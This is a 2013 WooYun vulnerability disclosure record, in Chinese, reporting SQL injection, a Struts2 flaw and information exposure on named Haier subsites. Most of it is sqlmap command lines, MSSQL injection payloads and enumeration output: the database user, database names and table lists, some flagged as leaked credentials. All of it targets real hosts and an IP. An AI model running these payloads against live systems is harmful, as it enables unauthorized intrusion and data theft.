{"id": 59854, "wybug_id": "wooyun-2013-045837", "wybug_title": "海尔集团#某几个分站存在多个安全漏洞（SQL注射、sturts2、信息泄露）", "wybug_corp": "海尔集团", "wybug_author": "Mr.leo", "wybug_date": "2013-12-13 18:37", "wybug_open_date": "2013-12-18 18:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 海尔集团#某几个分站存在多个安全漏洞（SQL注射、sturts2、信息泄露） 详细说明：  站点1：http://su.haierzmd.com 沭阳县华林电器销售经营部海尔客户管理系统ID参数没有过滤，导致注射Target: \t\thttp://su.haierzmd.com/zclr1.asp?ID=60Host IP:\t\t(Proxy IP)Web Server: \tMicrosoft-IIS/6.0Powered-by: \tASP.NETDB Server: \tMsSQL no errorResp. Time(avg):\t90 msCurrent User: \tdboCurrent DB: \tssy988haier2System User: \tsaHost Name: \t1-BF62C59DACDA4Server Name: \t1-BF62C59DACDA4\t\tmaster\t\ttempdb\t\tmodel\t\tmsdb\t\tpubs\t\tNorthwind\t\tssy988haier2\t\tgy@haier#gy2\t\txs\t\txs@988\t\txshaier988haier\t\txshaierzmd\t\thuanghaifeng#988\t\tshopxp#gsb988\t\tchenghaiyue#988\t\tgsb#988用户名密码侧漏\n\nPlace: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=60 AND 5498=5498    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: ID=60 AND 7128=CONVERT(INT,(CHAR(58)+CHAR(117)+CHAR(107)+CHAR(104)+CHAR(58)+(SELECT (CASE WHEN (7128=7128) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(98)+CHAR(120)+CHAR(122)+CHAR(58)))---[14:53:44] [INFO] testing Microsoft SQL Server[14:53:44] [INFO] confirming Microsoft SQL Server[14:53:44] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[14:53:44] [INFO] fetching current user[14:53:44] [INFO] retrieved: sacurrent user:    'sa'[14:53:44] [INFO] fetching current database[14:53:45] [INFO] retrieved: ssy988haier2current database:    'ssy988haier2'[14:53:45] [INFO] fetching database names[14:53:45] [INFO] the SQL query used returns 17 entries[14:53:45] [INFO] retrieved: chenghaiyue#988[14:53:45] [INFO] retrieved: gsb#988[14:53:45] [INFO] retrieved: gy@haier#gy2[14:53:46] [INFO] retrieved: huanghaifeng#988[14:53:46] [INFO] retrieved: huangwei_gsb#988[14:53:46] [INFO] retrieved: master[14:53:46] [INFO] retrieved: model[14:53:46] [INFO] retrieved: msdb[14:53:47] [INFO] retrieved: Northwind[14:53:47] [INFO] retrieved: pubs[14:53:47] [INFO] retrieved: shopxp#gsb988[14:53:47] [INFO] retrieved: ssy988haier2[14:53:47] [INFO] retrieved: tempdb[14:53:47] [INFO] retrieved: xs[14:53:48] [INFO] retrieved: xs@988[14:53:48] [INFO] retrieved: xshaier988haier[14:53:48] [INFO] retrieved: xshaierzmdavailable databases [17]:[*] chenghaiyue#988[*] gsb#988[*] gy@haier#gy2[*] huanghaifeng#988[*] huangwei_gsb#988[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] shopxp#gsb988[*] ssy988haier2[*] tempdb[*] xs[*] xs@988[*] xshaier988haier[*] xshaierzmdDatabase: ssy988haier2[49 tables]+--------------------+| dbo.VIEW1          || dbo.VIEW2          || dbo.VIEW3          || dbo.amdin          || dbo.anzhuang       || dbo.cangcu         || dbo.cpfl           || dbo.cpmc           || dbo.cpxh           || dbo.cw             || dbo.cy             || dbo.cy2            || dbo.cy3            || dbo.cy4            || dbo.cy5            || dbo.dindang        || dbo.dtproperties   || dbo.dzj            || dbo.feyong         || dbo.hcp            || dbo.huiyun         || dbo.hy             || dbo.ip             || dbo.js             || dbo.jzsz           || dbo.kp             || dbo.kp2            || dbo.ms             || dbo.msanzhuan      || dbo.mskp           || dbo.msyd           || dbo.pic_elm        || dbo.pic_pic        || dbo.pic_tm         || dbo.pic_ylm        || dbo.ps             || dbo.qy             || dbo.rk             || dbo.sysconstraints || dbo.syssegments    || dbo.tg             || dbo.tz             || dbo.xzcp           || dbo.xzrk           || dbo.xztm           || dbo.yg             || dbo.yuyue          || dbo.zc             || dbo.zclr           |+--------------------+站点2：http://xs.haierzmd.com/ 响水海尔客户管理系统sqlmap.py -u \"http://xs.haierzmd.com/zclr1.asp?ID=60\" --dbs --current-user --current-dbGET parameter 'ID' is vulnerable. Do you want to keep testing the others (i)? [y/N] nsqlmap identified the following injection points with a total of 26 HTTP(s)ests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=60 AND 6325=6325    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING cl    Payload: ID=60 AND 2259=CONVERT(INT,(CHAR(58)+CHAR(122)+CHAR(99)+CHAR(9AR(58)+(SELECT (CASE WHEN (2259=2259) THEN CHAR(49) ELSE CHAR(48) END))+CHA+CHAR(122)+CHAR(113)+CHAR(119)+CHAR(58)))---[15:00:00] [INFO] testing Microsoft SQL Server[15:00:00] [INFO] confirming Microsoft SQL Server[15:00:01] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[15:00:01] [INFO] fetching current user[15:00:01] [INFO] retrieved: sacurrent user:    'sa'[15:00:01] [INFO] fetching current database[15:00:01] [INFO] retrieved: xshaier988haiercurrent database:    'xshaier988haier'[15:00:01] [INFO] fetching database names[15:00:01] [INFO] the SQL query used returns 17 entries[15:00:01] [INFO] retrieved: chenghaiyue#988[15:00:02] [INFO] retrieved: gsb#988[15:00:02] [INFO] retrieved: gy@haier#gy2[15:00:02] [INFO] retrieved: huanghaifeng#988[15:00:02] [INFO] retrieved: huangwei_gsb#988[15:00:02] [INFO] retrieved: master[15:00:03] [INFO] retrieved: model[15:00:03] [INFO] retrieved: msdb[15:00:03] [INFO] retrieved: Northwind[15:00:03] [INFO] retrieved: pubs[15:00:03] [INFO] retrieved: shopxp#gsb988[15:00:04] [INFO] retrieved: ssy988haier2[15:00:04] [INFO] retrieved: tempdb[15:00:04] [INFO] retrieved: xs[15:00:04] [INFO] retrieved: xs@988[15:00:04] [INFO] retrieved: xshaier988haier[15:00:05] [INFO] retrieved: xshaierzmdavailable databases [17]:[*] chenghaiyue#988[*] gsb#988[*] gy@haier#gy2[*] huanghaifeng#988[*] huangwei_gsb#988[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] shopxp#gsb988[*] ssy988haier2[*] tempdb[*] xs[*] xs@988[*] xshaier988haier[*] xshaierzmd\n\nDatabase: xshaier988haier[66 tables]+--------------------+| dbo.VIEW1          || dbo.VIEW2          || dbo.VIEW3          || dbo.VIEW4          || dbo.VIEW5          || dbo.amdin          || dbo.anw            || dbo.anzhuang       || dbo.azg            || dbo.cangcu         || dbo.cpfl           || dbo.cpjj           || dbo.cpmc           || dbo.cpxh           || dbo.cw             || dbo.cy             || dbo.dindang        || dbo.dtproperties   || dbo.dzj            || dbo.feyong         || dbo.hcp            || dbo.huiyun         || dbo.hy             || dbo.hypic          || dbo.ip             || dbo.jnbt           || dbo.js             || dbo.jzsz           || dbo.kp             || dbo.kp2            || dbo.kpxz           || dbo.ms             || dbo.msanzhuan      || dbo.msdy           || dbo.mskp           || dbo.mskp2          || dbo.mslr           || dbo.msyd           || dbo.pczc           || dbo.pic_elm        || dbo.pic_pic        || dbo.pic_tm         || dbo.pic_ylm        || dbo.ps             || dbo.qy             || dbo.rk             || dbo.rktm           || dbo.sc             || dbo.sc_lx          || dbo.sj             || dbo.sysconstraints || dbo.syssegments    || dbo.tg             || dbo.tz             || dbo.wd             || dbo.wldw           || dbo.wzps           || dbo.xzcp           || dbo.xzcy           || dbo.xztm           || dbo.yg             || dbo.ygjk           || dbo.ygsz           || dbo.yuyue          || dbo.zc             || dbo.zclr           |+--------------------+ \n\n\n\n另外su.haierzmd.com没有设置robots，导致被搜索引擎抓取，未授权查看信息并操作相关功能\n\n有用户名密码后台我就不深入了，跟 WooYun: 海尔集团#某重要管理系统存在SQL注入导致后台沦陷 一样。站点3：http://123.234.41.57/  海尔商旅电子商务平台存在sturts2漏洞http://123.234.41.57/loginAction!doLogin.action\n\n\n\ntest.txt上传\n\nover   漏洞证明：  已经证明   修复方案：  1#升级struts2版本2# WooYun: 海尔集团#某重要管理系统存在SQL注入导致后台沦陷   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-18 18:38 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-23 11:04 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  忽略？@海尔集团，什么心态？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}